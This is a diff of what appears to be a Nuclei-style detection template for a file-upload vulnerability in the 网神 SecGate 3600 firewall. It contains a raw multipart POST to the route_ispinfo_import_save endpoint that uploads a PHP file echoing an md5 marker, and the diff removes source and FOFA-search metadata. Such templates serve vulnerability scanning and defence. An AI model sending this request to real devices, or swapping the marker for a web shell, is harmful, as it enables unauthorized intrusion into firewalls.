@@ -3,12 +3,8 @@ info:
   name: 网神 SecGate 3600 防火墙 route_ispinfo_import_save 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mecr5k01vf33hsei'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mecr5k01vf33hsei
-    fofa: title="网神SecGate 3600防火墙"
 http:
 - raw:
   - 'POST /?g=route_ispinfo_import_save HTTP/1.1
@@ -23,14 +19,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
-
-
     ------WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
     Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-
 
 
     10000000
@@ -45,8 +37,6 @@ http:
     Content-Type: text/plain
 
 
-
-
     <?php echo md5(''666'');?>
 
 
@@ -54,8 +44,6 @@ http:
 
 
     Content-Disposition: form-data; name="submit_post"
-
-
 
 
     route_ispinfo_import_save
